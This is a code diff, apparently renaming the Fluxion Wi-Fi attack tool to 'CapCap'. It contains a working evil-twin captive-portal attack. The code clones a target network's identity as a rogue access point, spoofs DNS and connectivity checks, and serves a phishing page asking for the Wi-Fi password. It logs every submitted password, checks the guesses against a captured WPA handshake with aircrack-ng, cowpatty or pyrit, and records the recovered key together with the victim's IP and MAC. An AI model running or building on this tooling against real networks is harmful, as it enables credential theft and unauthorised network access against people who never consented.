   # Attempt adding generic portals only if the directory exists.
-  if [ -d "$FLUXIONPath/attacks/Captive Portal/generic/languages" ]; then
+  if [ -d "$CAPCAPPath/attacks/Captive Portal/generic/languages" ]; then
     # Normalize the names of the generic portals for presentation.
-    for site in "$FLUXIONPath/attacks/Captive Portal/generic/languages/"*.lang; do
+    for site in "$CAPCAPPath/attacks/Captive Portal/generic/languages/"*.lang; do
       sites+=("${CaptivePortalGenericInterfaceOption}_$(basename "${site%.lang}")")
     done
   fi
 
   # Attempt adding custom portals only if the directory exists.
-  if [ -d "$FLUXIONPath/attacks/Captive Portal/sites" ]; then
+  if [ -d "$CAPCAPPath/attacks/Captive Portal/sites" ]; then
     # Retrieve available portal sites and strip the .portal extension.
-    for site in "$FLUXIONPath/attacks/Captive Portal/sites/"*.portal; do
+    for site in "$CAPCAPPath/attacks/Captive Portal/sites/"*.portal; do
       sites+=("$(basename "${site%.portal}")")
     done
   fi
 
-  local sitesIdentifier=("${sites[@]/_*/}" "$FLUXIONGeneralBackOption")
+  local sitesIdentifier=("${sites[@]/_*/}" "$CAPCAPGeneralBackOption")
   local sitesLanguage=("${sites[@]/*_/}")
 
   format_center_dynamic "$CRed[$CYel%02d$CRed]$CClr %-44b $CBlu%10s$CClr"
   local queryFieldOptionsFormat=$FormatCenterDynamic
 
-  fluxion_header
+  capcap_header
 
-  echo -e "$FLUXIONVLine $CaptivePortalUIQuery"
+  echo -e "$CAPCAPVLine $CaptivePortalUIQuery"
 
   echo
 
-  fluxion_target_show "$FluxionTargetSSID" "$FluxionTargetEncryption" \
-    "$FluxionTargetChannel" "$FluxionTargetMAC" "$FluxionTargetMaker"
+  capcap_target_show "$CapCapTargetSSID" "$CapCapTargetEncryption" \
+    "$CapCapTargetChannel" "$CapCapTargetMAC" "$CapCapTargetMaker"
 
   io_query_format_fields "" "$queryFieldOptionsFormat\n" \
     sitesIdentifier[@] sitesLanguage[@]
@@ -872,10 +872,10 @@ captive_portal_set_user_interface() {
   case "$site" in
     "$CaptivePortalGenericInterfaceOption")
       CaptivePortalUserInterface=$siteLanguage
-    #  source "$FLUXIONPath/attacks/Captive Portal/generic/languages/$siteLanguage.lang"
+    #  source "$CAPCAPPath/attacks/Captive Portal/generic/languages/$siteLanguage.lang"
     #  captive_portal_generic
       ;;
-    "$FLUXIONGeneralBackOption")
+    "$CAPCAPGeneralBackOption")
       captive_portal_unset_user_interface
       return 1
       ;;
@@ -887,9 +887,9 @@ captive_portal_set_user_interface() {
 
 
 captive_portal_get_client_IP() {
-  if [ -f "$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log" ]; then
+  if [ -f "$CaptivePortalPassLog/$CapCapTargetSSIDClean-$CapCapTargetMAC-IP.log" ]; then
     MatchedClientIP=$(
-      cat "$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log" | \
+      cat "$CaptivePortalPassLog/$CapCapTargetSSIDClean-$CapCapTargetMAC-IP.log" | \
         sed '/^\s*$/d' | tail -n 1 | head -n 1
     )
   else
@@ -900,7 +900,7 @@ captive_portal_get_client_IP() {
 }
 
 captive_portal_get_IP_MAC() {
-  if [ -f "$CaptivePortalPassLog/$FluxionTargetSSIDClean-$FluxionTargetMAC-IP.log" ] && \
+  if [ -f "$CaptivePortalPassLog/$CapCapTargetSSIDClean-$CapCapTargetMAC-IP.log" ] && \
     [ "$(captive_portal_get_client_IP)" != "" ] && \
     [ -f "$CaptivePortalKeaLeases" ]; then
     local IP=$(captive_portal_get_client_IP)
@@ -936,13 +936,13 @@ captive_portal_get_MAC_brand() {
 
 captive_portal_unset_attack() {
   sandbox_remove_workfile \
-    "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    "$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
   sandbox_remove_workfile \
-    "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/lighttpd.conf"
+    "$CAPCAPWorkspacePath/capcap_captive_portal_dns.py"
+  sandbox_remove_workfile "$CAPCAPWorkspacePath/lighttpd.conf"
   rm -f "$CaptivePortalKeaLeases" "$CaptivePortalKeaLeases.2"
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal/check.php"
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"
+  sandbox_remove_workfile "$CAPCAPWorkspacePath/captive_portal/check.php"
+  sandbox_remove_workfile "$CAPCAPWorkspacePath/captive_portal"
 
   # Only reset the AP if one has been defined.
   if [ "$CaptivePortalAPService" -a "$(type -t ap_service_reset)" ]; then
@@ -964,11 +964,11 @@ captive_portal_sed_replacement() {
 # Substitute the target's SSID, BSSID and channel into every rendered file.
 captive_portal_render_target() {
   local __ssid __mac __channel
-  __ssid=$(captive_portal_sed_replacement "$FluxionTargetSSID")
-  __mac=$(captive_portal_sed_replacement "$FluxionTargetMAC")
-  __channel=$(captive_portal_sed_replacement "$FluxionTargetChannel")
+  __ssid=$(captive_portal_sed_replacement "$CapCapTargetSSID")
+  __mac=$(captive_portal_sed_replacement "$CapCapTargetMAC")
+  __channel=$(captive_portal_sed_replacement "$CapCapTargetChannel")
 
-  find "$FLUXIONWorkspacePath/captive_portal/" -type f -exec \
+  find "$CAPCAPWorkspacePath/captive_portal/" -type f -exec \
     sed -i -e "s/\$APTargetSSID/$__ssid/g" \
            -e "s/\$APTargetMAC/$__mac/g" \
            -e "s/\$APTargetChannel/$__channel/g" {} +
@@ -976,12 +976,12 @@ captive_portal_render_target() {
 
 # Create different settings required for the script
 captive_portal_set_attack() {
-  local -r attackPath="$FLUXIONPath/attacks/Captive Portal"
+  local -r attackPath="$CAPCAPPath/attacks/Captive Portal"
   # Load and set the captive portal user interface to the workspace.
   # Check whether it's a custom, generic, or invalid portal.
   if [ -d "$attackPath/sites/$CaptivePortalUserInterface.portal" ]; then
     cp -r "$attackPath/sites/$CaptivePortalUserInterface.portal" \
-      "$FLUXIONWorkspacePath/captive_portal"
+      "$CAPCAPWorkspacePath/captive_portal"
   elif [ -f "$attackPath/generic/languages/$CaptivePortalUserInterface.lang" ]; then
     source "$attackPath/generic/languages/$CaptivePortalUserInterface.lang"
     captive_portal_generic
@@ -997,16 +997,16 @@ captive_portal_set_attack() {
   local authenticatorFiles=("authenticator.php" "check.php" "update.php")
 
   for authenticatorFile in "${authenticatorFiles[@]}"; do
-    cp "$FLUXIONPath/attacks/Captive Portal/lib/$authenticatorFile" \
-      "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
-    sed -i -e 's/\$FLUXIONWorkspacePath/'"${FLUXIONWorkspacePath//\//\\\/}"'/g' \
-      "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
-    chmod u+x "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
+    cp "$CAPCAPPath/attacks/Captive Portal/lib/$authenticatorFile" \
+      "$CAPCAPWorkspacePath/captive_portal/$authenticatorFile"
+    sed -i -e 's/\$CAPCAPWorkspacePath/'"${CAPCAPWorkspacePath//\//\\\/}"'/g' \
+      "$CAPCAPWorkspacePath/captive_portal/$authenticatorFile"
+    chmod u+x "$CAPCAPWorkspacePath/captive_portal/$authenticatorFile"
   done
 
   # Add the files for captive portal internet connectivity checks.
-  cp -r "$FLUXIONPath/attacks/Captive Portal/lib/connectivity responses/" \
-    "$FLUXIONWorkspacePath/captive_portal/connectivity_responses"
+  cp -r "$CAPCAPPath/attacks/Captive Portal/lib/connectivity responses/" \
+    "$CAPCAPWorkspacePath/captive_portal/connectivity_responses"
 
 
   # AP Service: Prepare service for an attack.
@@ -1014,9 +1014,9 @@ captive_portal_set_attack() {
     ap_service_prep \
       "$CaptivePortalAccessPointInterface" \
       "$CaptivePortalGatewayAddress" \
-      "$FluxionTargetSSID" \
-      "$FluxionTargetRogueMAC" \
-      "${CaptivePortalAccessPointChannel:-$FluxionTargetChannel}"
+      "$CapCapTargetSSID" \
+      "$CapCapTargetRogueMAC" \
+      "${CaptivePortalAccessPointChannel:-$CapCapTargetChannel}"
 
     CaptivePortalAccessInterface=$APServiceAccessInterface
   fi
@@ -1061,7 +1061,7 @@ captive_portal_set_attack() {
     ]
   }
 }\
-" >"$FLUXIONWorkspacePath/kea-dhcp4.conf"
+" >"$CAPCAPWorkspacePath/kea-dhcp4.conf"
 
   # Generate configuration for a lighttpd web-server.
   # Resolve php-cgi instead of assuming /usr/bin: Debian and Kali ship it
@@ -1070,7 +1070,7 @@ captive_portal_set_attack() {
   phpCgi=$(command -v php-cgi 2>/dev/null || echo /usr/bin/php-cgi)
 
   echo "\
-server.document-root = \"$FLUXIONWorkspacePath/captive_portal/\"
+server.document-root = \"$CAPCAPWorkspacePath/captive_portal/\"
 
 server.modules = (
     \"mod_access\",
@@ -1081,13 +1081,13 @@ server.modules = (
     \"mod_rewrite\"
 )
 
-accesslog.filename = \"$FLUXIONWorkspacePath/lighttpd.log\"
+accesslog.filename = \"$CAPCAPWorkspacePath/lighttpd.log\"
 
 fastcgi.server = (
     \".php\" => (
         (
             \"bin-path\" => \"$phpCgi\",
-            \"socket\" => \"$FLUXIONWorkspacePath/php.socket\"
+            \"socket\" => \"$CAPCAPWorkspacePath/php.socket\"
         )
     )
 )
@@ -1122,16 +1122,16 @@ index-file.names = (
     \"index.html\",
     \"index.php\"
 )
-" >"$FLUXIONWorkspacePath/lighttpd.conf"
+" >"$CAPCAPWorkspacePath/lighttpd.conf"
 
   # Configure lighttpd's SSL only if we've got a certificate and its key.
-  if [ -f "$FLUXIONWorkspacePath/server.pem" -a -s "$FLUXIONWorkspacePath/server.pem" ]; then
+  if [ -f "$CAPCAPWorkspacePath/server.pem" -a -s "$CAPCAPWorkspacePath/server.pem" ]; then
     echo "\
 \$SERVER[\"socket\"] == \":443\" {
     ssl.engine = \"enable\"
-    ssl.pemfile = \"$FLUXIONWorkspacePath/server.pem\"
+    ssl.pemfile = \"$CAPCAPWorkspacePath/server.pem\"
 }
-" >>"$FLUXIONWorkspacePath/lighttpd.conf"
+" >>"$CAPCAPWorkspacePath/lighttpd.conf"
   fi
 
   if [ "$CaptivePortalConnectivity" = "emulated" ]; then
@@ -1139,16 +1139,16 @@ index-file.names = (
 # The following will emulate Apple's and Google's internet connectivity checks.
 # This should help with no-internet-connection warnings in some devices.
 \$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
-    server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Apple/\"
+    server.document-root = \"$CAPCAPWorkspacePath/captive_portal/connectivity_responses/Apple/\"
 }
 
 # Respond with Google's captive response on certain domains.
 # Domains: www.google.com, clients[0-9].google.com, connectivitycheck.gstatic.com, connectivitycheck.android.com, android.clients.google.com, alt[0-9]-mtalk.google.com, mtalk.google.com
 \$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*|(alt[0-9]*-)?mtalk)\.google|connectivitycheck\.(android|gstatic))\.com\" {
-    server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
+    server.document-root = \"$CAPCAPWorkspacePath/captive_portal/connectivity_responses/Google/\"
     url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
 }
-" >>"$FLUXIONWorkspacePath/lighttpd.conf"
+" >>"$CAPCAPWorkspacePath/lighttpd.conf"
   else
     echo "\
 # Redirect all traffic to the captive portal when not emulating a connection.
@@ -1158,7 +1158,7 @@ index-file.names = (
         \"^/(.*)\" => \"http://captive.gateway.lan/\",
     )
 }
-" >>"$FLUXIONWorkspacePath/lighttpd.conf"
+" >>"$CAPCAPWorkspacePath/lighttpd.conf"
   fi
 
   # Create a temporary hosts file to be used with dnsspoof
@@ -1167,11 +1167,11 @@ ${CaptivePortalGatewayAddress}	*.*
 172.217.5.238	google.com
 172.217.13.78	clients3.google.com
 172.217.13.78	clients4.google.com
-" >"$FLUXIONWorkspacePath/hosts"
+" >"$CAPCAPWorkspacePath/hosts"
 
-  #chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
+  #chmod +x "$CAPCAPWorkspacePath/capcap_captive_portal_dns.py"
 
-  local -r targetSSIDCleanNormalized=${FluxionTargetSSIDClean//"/\\"}
+  local -r targetSSIDCleanNormalized=${CapCapTargetSSIDClean//"/\\"}
   # Attack arbiter script
   echo "\
 #!/usr/bin/env bash
@@ -1188,8 +1188,8 @@ handle_abort_authenticator() {
 trap signal_stop_attack SIGINT SIGHUP
 trap handle_abort_authenticator SIGABRT
 
-echo > \"$FLUXIONWorkspacePath/candidate.txt\"
-echo -n \"0\"> \"$FLUXIONWorkspacePath/hit.txt\"
+echo > \"$CAPCAPWorkspacePath/candidate.txt\"
+echo -n \"0\"> \"$CAPCAPWorkspacePath/hit.txt\"
 
 # Assure we've got a directory to store net logs into.
 if [ ! -d \"$CaptivePortalNetLog\" ]; then
@@ -1242,31 +1242,31 @@ while [ \$AuthenticatorState = \"running\" ]; do
         ih=
     fi
 
-    if [ -f \"$FLUXIONWorkspacePath/pwdattempt.txt\" -a -s \"$FLUXIONWorkspacePath/pwdattempt.txt\" ]; then
+    if [ -f \"$CAPCAPWorkspacePath/pwdattempt.txt\" -a -s \"$CAPCAPWorkspacePath/pwdattempt.txt\" ]; then
         # Save any new password attempt.
-        cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"
+        cat \"$CAPCAPWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC.log\"
 
         # Clear logged password attempt.
-        echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
+        echo -n > \"$CAPCAPWorkspacePath/pwdattempt.txt\"
     fi
 
-    if [ -s \"$FLUXIONWorkspacePath/ip_hits\" ]; then
-        cat \"$FLUXIONWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
-        echo \" \" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
-        echo -n > \"$FLUXIONWorkspacePath/ip_hits\"
+    if [ -s \"$CAPCAPWorkspacePath/ip_hits\" ]; then
+        cat \"$CAPCAPWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC-IP.log\"
+        echo \" \" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC-IP.log\"
+        echo -n > \"$CAPCAPWorkspacePath/ip_hits\"
     fi
 
-" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
 
   if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
     case "$CaptivePortalAuthenticatorMode" in
       # Cowpatty
       "$CaptivePortalVerificationMethodCowpattyOption")
-        local -r verifiedCondition="cowpatty -f \"$FLUXIONWorkspacePath/candidate.txt\" -r \"$CaptivePortalHashPath\" -s \"$FluxionTargetSSID\" &>> $FLUXIONOutputDevice"
+        local -r verifiedCondition="cowpatty -f \"$CAPCAPWorkspacePath/candidate.txt\" -r \"$CaptivePortalHashPath\" -s \"$CapCapTargetSSID\" &>> $CAPCAPOutputDevice"
         ;;
       # Pyrit
       "$CaptivePortalVerificationMethodPyritOption")
-        local -r verifiedCondition="pyrit -r \"$CaptivePortalHashPath\" -i \"$FLUXIONWorkspacePath/candidate.txt\" -b $FluxionTargetMAC attack_passthrough &>> $FLUXIONOutputDevice"
+        local -r verifiedCondition="pyrit -r \"$CaptivePortalHashPath\" -i \"$CAPCAPWorkspacePath/candidate.txt\" -b $CapCapTargetMAC attack_passthrough &>> $CAPCAPOutputDevice"
         ;;
 
       *)
@@ -1278,27 +1278,27 @@ while [ \$AuthenticatorState = \"running\" ]; do
         # output, which false-accepts ANY password whenever aircrack prints
         # neither string (e.g. \"No matching network found\" when the capture
         # holds no usable handshake). Remove any stale key first.
-        local -r verifiedCondition="rm -f \"$FLUXIONWorkspacePath/candidate.key\"; aircrack-ng -a 2 -b $FluxionTargetMAC -w \"$FLUXIONWorkspacePath/candidate.txt\" -l \"$FLUXIONWorkspacePath/candidate.key\" \"$CaptivePortalHashPath\" &>> $FLUXIONOutputDevice; [ -s \"$FLUXIONWorkspacePath/candidate.key\" ]"
+        local -r verifiedCondition="rm -f \"$CAPCAPWorkspacePath/candidate.key\"; aircrack-ng -a 2 -b $CapCapTargetMAC -w \"$CAPCAPWorkspacePath/candidate.txt\" -l \"$CAPCAPWorkspacePath/candidate.key\" \"$CaptivePortalHashPath\" &>> $CAPCAPOutputDevice; [ -s \"$CAPCAPWorkspacePath/candidate.key\" ]"
         ;;
     esac
     echo "
-    if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
+    if [ -f \"$CAPCAPWorkspacePath/candidate_result.txt\" ]; then
         if $verifiedCondition; then
-            echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
+            echo \"2\" > \"$CAPCAPWorkspacePath/candidate_result.txt\"
             sleep 1
             break
         else
-            echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
+            echo \"1\" > \"$CAPCAPWorkspacePath/candidate_result.txt\"
         fi
-    fi" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    fi" >> "$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
   fi
 
-  local -r staticSSID=$(printf "%q" "$FluxionTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
+  local -r staticSSID=$(printf "%q" "$CapCapTargetSSID" | sed -r 's/\\\ / /g' | sed -r "s/\\\'/\'/g")
 
   # Show the rogue AP channel separately only when it differs from the target's.
-  local -r rogueAPChannel="${CaptivePortalAccessPointChannel:-$FluxionTargetChannel}"
+  local -r rogueAPChannel="${CaptivePortalAccessPointChannel:-$CapCapTargetChannel}"
   local apChannelInfoLine=""
-  if [ "$rogueAPChannel" != "$FluxionTargetChannel" ]; then
+  if [ "$rogueAPChannel" != "$CapCapTargetChannel" ]; then
     apChannelInfoLine="    echo -e \"    AP Channel .....: ${CWht}${rogueAPChannel}${CClr}\""
   fi
 
@@ -1306,16 +1306,16 @@ while [ \$AuthenticatorState = \"running\" ]; do
     echo
     echo -e \"  ACCESS POINT:\"
     printf  \"    SSID ...........: $CWht%s$CClr\\n\" \"$staticSSID\"
-    echo -e \"    MAC ............: $CYel$FluxionTargetMAC$CClr\"
-    echo -e \"    Channel ........: $CWht$FluxionTargetChannel$CClr\"
+    echo -e \"    MAC ............: $CYel$CapCapTargetMAC$CClr\"
+    echo -e \"    Channel ........: $CWht$CapCapTargetChannel$CClr\"
 $apChannelInfoLine
-    echo -e \"    Vendor .........: $CGrn${FluxionTargetMaker:-UNKNOWN}$CClr\"
+    echo -e \"    Vendor .........: $CGrn${CapCapTargetMaker:-UNKNOWN}$CClr\"
     echo -e \"    Runtime ........: $CBlu\$ih\$h:\$im\$m:\$is\$s$CClr\"
-    echo -e \"    Attempts .......: $CRed\$(cat $FLUXIONWorkspacePath/hit.txt)$CClr\"
+    echo -e \"    Attempts .......: $CRed\$(cat $CAPCAPWorkspacePath/hit.txt)$CClr\"
     echo -e \"    Clients ........: $CBlu\$(awk -F, 'NR>1 && \$10==0 {print \$2}' \"$CaptivePortalKeaLeases\" 2>/dev/null | sort| uniq | wc -l)$CClr\"
     echo
     echo -e \"  CLIENTS ONLINE:\"
-" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
 
   if [ "$CaptivePortalAPService" = "airbase-ng" ]; then
     echo "
@@ -1344,7 +1344,7 @@ $apChannelInfoLine
         echo -e \"$CGrn\$x) $CRed\$LeaseIP $CYel\$LeaseMAC $CGrn\$LeaseHost $CClr($CBlu\$LeaseMID$CClr)\"
     done <<< \"\$CaptivePortalLeaseMACs\"
 
-    echo -ne \"\033[J\033[u\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    echo -ne \"\033[J\033[u\"" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
   else
     echo "
     CaptivePortalStationMACs=\$(iw dev \"$CaptivePortalAccessInterface\" station dump 2>/dev/null | awk '/^Station/ {print tolower(\$2)}' | sort -u)
@@ -1385,12 +1385,12 @@ $apChannelInfoLine
         echo -e \"$CGrn\$y) $CYel\$StationMAC $CClr($CBlu\$StationMID$CClr)\"
     done <<< \"\$CaptivePortalStationMACs\"
 
-    echo -ne \"\033[J\033[u\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    echo -ne \"\033[J\033[u\"" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
   fi
 
   if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
     echo "
-    sleep 1" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    sleep 1" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
   fi
 
   echo "
@@ -1399,10 +1399,10 @@ done
 if [ \$AuthenticatorState = \"aborted\" ]; then exit 1; fi
 
 clear
-echo \"1\" > \"$FLUXIONWorkspacePath/status.txt\"
+echo \"1\" > \"$CAPCAPWorkspacePath/status.txt\"
 
-# Mark success so fluxion can keep the authenticator window open once.
-touch "$FLUXIONWorkspacePath/authenticator_success.flag"
+# Mark success so capcap can keep the authenticator window open once.
+touch "$CAPCAPWorkspacePath/authenticator_success.flag"
 
 # sleep 7
 sleep 3
@@ -1410,7 +1410,7 @@ sleep 3
 signal_stop_attack
 
 # Resolve client IP/MAC/brand at runtime.
-ClientIP=\$(if [ -f \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\" ]; then cat \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\" | sed '/^\s*$/d' | tail -n 1; fi)
+ClientIP=\$(if [ -f \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC-IP.log\" ]; then cat \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$CapCapTargetMAC-IP.log\" | sed '/^\s*$/d' | tail -n 1; fi)
 if [ -z \"\$ClientIP\" ]; then ClientIP=\"unknown\"; fi
 if [ \"\$ClientIP\" != \"unknown\" ] && [ -f \"$CaptivePortalKeaLeases\" ]; then
     ClientMAC=\$(awk -F, -v ip=\"\$ClientIP\" 'NR>1 && \$1==ip {mac=\$2} END{print mac}' \"$CaptivePortalKeaLeases\" | tr [:upper:] [:lower:])
@@ -1426,40 +1426,40 @@ fi
 if echo \"\$ClientBrand\" | grep -q x; then ClientBrand=\"unknown\"; fi
 
 echo \"
-CAPCAPWIFI $FLUXIONVersion.$FLUXIONRevision
+CAPCAPWIFI $CAPCAPVersion.$CAPCAPRevision
 
 SSID: \\\"$staticSSID\\\"
-BSSID: $FluxionTargetMAC ($FluxionTargetMaker)
-Channel: $FluxionTargetChannel
-Security: $FluxionTargetEncryption
+BSSID: $CapCapTargetMAC ($CapCapTargetMaker)
+Channel: $CapCapTargetChannel
+Security: $CapCapTargetEncryption
 Time: \$ih\$h:\$im\$m:\$is\$s
-Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
+Password: \$(cat $CAPCAPWorkspacePath/candidate.txt)
 Mac: \$ClientMAC (\$ClientBrand)
 IP: \$ClientIP
-\" >\"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+\" >\"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$CapCapTargetMAC.log\"" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
 
   if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
 #    echo "
-# aircrack-ng -a 2 -b $FluxionTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
-#" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+# aircrack-ng -a 2 -b $CapCapTargetMAC -0 -s \"$CaptivePortalHashPath\" -w \"$CAPCAPWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$CapCapTargetMAC.log"$CClr"\"\
+#" >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
     echo "
-    echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log"$CClr"\"\
-      " >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+    echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$CapCapTargetMAC.log"$CClr"\"\
+      " >>"$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
   fi
 
-  chmod +x "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
+  chmod +x "$CAPCAPWorkspacePath/captive_portal_authenticator.sh"
 }
 
 # Generate the contents for a generic web interface
 captive_portal_generic() {
-  if [ ! -d "$FLUXIONWorkspacePath/captive_portal" ]; then
-    mkdir "$FLUXIONWorkspacePath/captive_portal"
+  if [ ! -d "$CAPCAPWorkspacePath/captive_portal" ]; then
+    mkdir "$CAPCAPWorkspacePath/captive_portal"
   fi
 
-  base64 -d "$FLUXIONPath/attacks/Captive Portal/generic/assets" >"$FLUXIONWorkspacePath/file.zip"
+  base64 -d "$CAPCAPPath/attacks/Captive Portal/generic/assets" >"$CAPCAPWorkspacePath/file.zip"
 
-  unzip "$FLUXIONWorkspacePath/file.zip" -d "$FLUXIONWorkspacePath/captive_portal" &>$FLUXIONOutputDevice
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/file.zip"
+  unzip "$CAPCAPWorkspacePath/file.zip" -d "$CAPCAPWorkspacePath/captive_portal" &>$CAPCAPOutputDevice
+  sandbox_remove_workfile "$CAPCAPWorkspacePath/file.zip"
 
   echo "\
 <!DOCTYPE html>
@@ -1486,7 +1486,7 @@ captive_portal_generic() {
             </div>
         </div>
     </body>
-</html>" >"$FLUXIONWorkspacePath/captive_portal/final.html"
+</html>" >"$CAPCAPWorkspacePath/captive_portal/final.html"
 
   echo "\
 <!DOCTYPE html>
@@ -1516,7 +1516,7 @@ captive_portal_generic() {
             </div>
         </div>
     </body>
-</html>" >"$FLUXIONWorkspacePath/captive_portal/error.html"
+</html>" >"$CAPCAPWorkspacePath/captive_portal/error.html"
 
   echo "\
 <!DOCTYPE html>
@@ -1545,8 +1545,8 @@ captive_portal_generic() {
                     <form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
                         </br>
                         <div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
-                            <div><u>$FluxionTargetSSID</u> ($FluxionTargetMAC)</div>
-                            <!--<div>Channel: $FluxionTargetChannel</div>-->
+                            <div><u>$CapCapTargetSSID</u> ($CapCapTargetMAC)</div>
+                            <!--<div>Channel: $CapCapTargetChannel</div>-->
                         </div>
                         <div style=\"text-align:center;\">
                             <br>
@@ -1573,15 +1573,15 @@ captive_portal_generic() {
             });
         </script>
     </body>
-</html>" >"$FLUXIONWorkspacePath/captive_portal/index.html"
+</html>" >"$CAPCAPWorkspacePath/captive_portal/index.html"
 
 
 }
 
 captive_portal_unset_routes() {
-  if [ -f "$FLUXIONIPTablesBackup" ]; then
-    iptables-restore <"$FLUXIONIPTablesBackup" \
-      &>> $FLUXIONOutputDevice
+  if [ -f "$CAPCAPIPTablesBackup" ]; then
+    iptables-restore <"$CAPCAPIPTablesBackup" \
+      &>> $CAPCAPOutputDevice
   else
     iptables --flush
     iptables --table nat --flush
@@ -1590,11 +1590,11 @@ captive_portal_unset_routes() {
   fi
 
   # Restore system's original forwarding state
-  if [ -f "$FLUXIONWorkspacePath/ip_forward" ]; then
+  if [ -f "$CAPCAPWorkspacePath/ip_forward" ]; then
     sysctl -w net.ipv4.ip_forward=$(
-      cat "$FLUXIONWorkspacePath/ip_forward"
-    ) &>> $FLUXIONOutputDevice
-    sandbox_remove_workfile "$FLUXIONWorkspacePath/ip_forward"
+      cat "$CAPCAPWorkspacePath/ip_forward"
+    ) &>> $CAPCAPOutputDevice
+    sandbox_remove_workfile "$CAPCAPWorkspacePath/ip_forward"
   fi
 
   if [ "$CaptivePortalAccessInterface" ] && [ "$CaptivePortalGatewayAddress" ]; then
@@ -1610,10 +1610,10 @@ captive_portal_set_routes() {
   ip addr add "$CaptivePortalGatewayAddress/24" dev "$CaptivePortalAccessInterface" 2>/dev/null
 
   # Save the system's routing state to restore later.
-  cp "/proc/sys/net/ipv4/ip_forward" "$FLUXIONWorkspacePath/ip_forward"
+  cp "/proc/sys/net/ipv4/ip_forward" "$CAPCAPWorkspacePath/ip_forward"
 
   # Activate system IPV4 packet routing/forwarding.
-  sysctl -w net.ipv4.ip_forward=1 &>$FLUXIONOutputDevice
+  sysctl -w net.ipv4.ip_forward=1 &>$CAPCAPOutputDevice
 
   iptables --flush
   iptables --table nat --flush
@@ -1643,34 +1643,34 @@ captive_portal_stop_interface() {
 
 captive_portal_start_interface() {
   if [ "$CaptivePortalAPService" ]; then
-    echo -e "$FLUXIONVLine $CaptivePortalStaringAPServiceNotice"
+    echo -e "$CAPCAPVLine $CaptivePortalStaringAPServiceNotice"
     ap_service_start || return 1
   else
-    fluxion_header
+    capcap_header
 
-    echo -e "$FLUXIONVLine Configuration for external access point device:"
